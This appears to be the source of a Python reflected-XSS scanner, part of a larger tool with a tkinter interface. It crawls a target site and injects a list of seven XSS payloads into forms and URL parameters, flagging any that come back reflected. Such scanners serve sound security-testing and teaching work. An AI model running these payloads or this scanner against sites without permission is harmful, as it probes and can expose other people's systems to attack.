import requests
from vulnerability.crawl import Crawl
import tkinter as tk
import re

class XSS(Crawl):
    def __init__(self, target_url, ignore_links, output_text):
        super().__init__(target_url, ignore_links)
        self.output_text = output_text
        self.payloads = [
            "<script>alert(1)</script>", 
            "\"><script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>"
        ]

    def run_program(self):
        for link in self.target_link:
            forms = self.extract_fourms(link)
            for form in forms:
                for payload in self.payloads:
                    try:
                        self.log(f"[+] Testing form for XSS on {link}")
                        response = self.submit_form(form, payload, link)
                        if payload in response.text:
                            self.log(f"[!!!] XSS vulnerability found on {link}")
                            self.log(f"Payload: {payload}")
                            break
                    except Exception as e:
                        self.log(f"[!] Form XSS test error: {e}")
            if "=" in link:
                for payload in self.payloads:
                    try:
                        test_url = link.replace("=", f"={payload}", 1)
                        self.log(f"[+] Testing URL for XSS: {test_url}")
                        response = self.session.get(test_url)
                        if payload in response.text:
                            self.log(f"[!!!] XSS vulnerability found in URL: {link}")
                            self.log(f"Payload: {payload}")
                            break
                    except Exception as e:
                        self.log(f"[!] URL XSS test error: {e}")

    def log(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)
